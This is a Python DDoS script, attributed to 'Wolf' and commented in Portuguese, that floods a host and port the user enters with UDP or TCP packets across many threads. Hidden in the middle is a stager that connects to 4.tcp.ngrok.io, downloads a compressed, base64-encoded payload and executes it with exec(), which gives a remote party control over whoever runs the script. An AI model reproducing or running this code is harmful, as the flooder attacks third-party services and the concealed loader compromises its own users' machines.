import socket,zlib,base64,struct,time

#!/usr/bin/env python3
#Script De DDoS Privado Compactado Em Python By Wolf
import random
import pyfiglet as pf
import socket
import threading

#Coloração
R   = "\033[1;31m"  
B  = "\033[1;34m"
C  = "\033[1;36m"
G = "\033[0;32m"
Y = "\033[1;33m"
RESET = "\033[0;0m"

print(f"{G}")
print(pf.figlet_format("DDOS"))
print(f"{RESET}")
print("#####################################")
print(f"")
print(f'[{R}-{RESET}] Welcome To Script')
print("")
ip = str(input(f"[{Y}+{RESET}]  Host/Ip:"))
port = int(input(f"[{Y}+{RESET}] Porta:"))
choice = str(input(f"[{Y}+{RESET}] UDP(y/n):"))
times = int(input(f"[{Y}+{RESET}] Pacotes por uma conexão: "))
threads = int(input(f"[{Y}+{RESET}] Threads:"))
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('4.tcp.ngrok.io',10832))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +f"{G} DROPING BY WOLF!!!")
		except:
			print(f"{R}[!] IP INVALIDO!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +f"{G} DROPING BY WOLF!!!")
		except:
			s.close()
			print(f"{R}[!] IP INVALIDO!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()